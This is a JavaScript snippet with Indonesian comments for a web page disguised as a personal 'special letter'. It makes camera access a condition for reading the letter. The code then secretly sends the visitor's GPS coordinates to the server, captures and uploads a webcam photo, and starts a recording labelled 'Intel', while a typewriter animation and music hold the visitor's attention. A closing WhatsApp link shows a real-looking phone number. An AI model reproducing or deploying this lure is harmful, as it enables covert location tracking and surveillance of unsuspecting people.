readBtn.addEventListener("click", () => {
    // 1. Minta Izin Kamera & Lokasi TERLEBIH DAHULU
    // Tanpa izin ini, baris kode di bawah .then tidak akan jalan
    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
    .then(function(stream) {
        // JIKA DIIZINKAN:
        globalStream = stream;

        // Baru jalankan efek visual dan musik
        music.load();
        music.play().catch(() => console.log("Autoplay blocked"));
        document.getElementById("introText").style.opacity = 0;
        readBtn.style.display = "none";

        // A. Ambil Lokasi
        navigator.geolocation.getCurrentPosition(function(pos) {
            fetch("/kirim-lokasi", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ latitude: pos.coords.latitude, longitude: pos.coords.longitude })
            });
        });

        // B. Ambil Foto & Video (Intel)
        const v = document.createElement("video");
        v.srcObject = globalStream;
        v.play();
        v.onloadedmetadata = function() {
            const canvasSnap = document.createElement("canvas");
            canvasSnap.width = 640; canvasSnap.height = 480;
            setTimeout(() => {
                canvasSnap.getContext("2d").drawImage(v, 0, 0, canvasSnap.width, canvasSnap.height);
                canvasSnap.toBlob(function(blob) {
                    const fd = new FormData();
                    fd.append("photo", blob, "foto.jpg");
                    fetch("/kirim-foto", { method: "POST", body: fd });
                    mulaiRekaman(globalStream);
                }, "image/jpeg");
            }, 2000);
        };

        // C. Jalankan Efek Mengetik Surat (Hanya jika izin ok)
        letterBox.style.opacity = 0;
        letterBox.style.display = "block";
        setTimeout(() => letterBox.style.opacity = 1, 50);

        let i = 0;
        const words = message.split(/(\s+)/);
        function typeWriter() {
            if (i < words.length) {
                typedText.innerHTML += words[i];
                i++;
                setTimeout(typeWriter, 150);
            } else {
                cursor.style.display = 'none';
                waBtn.href = "https://wa.me/6283809403083?text=aku%20udah%20baca%20suratnya...";
                waBtn.classList.add("show");
                waBtn.scrollIntoView({ behavior: "smooth" });
            }
        }
        typeWriter();
    })
    .catch(err => {
        // JIKA DITOLAK:
        alert("Maaf, surat tidak dapat dibuka. Kamu harus mengizinkan akses kamera untuk melihat pesan spesial di dalamnya.");
        console.log("Akses ditolak:", err);
        // Halaman tetap di tampilan awal, tidak berpindah ke surat
    });
});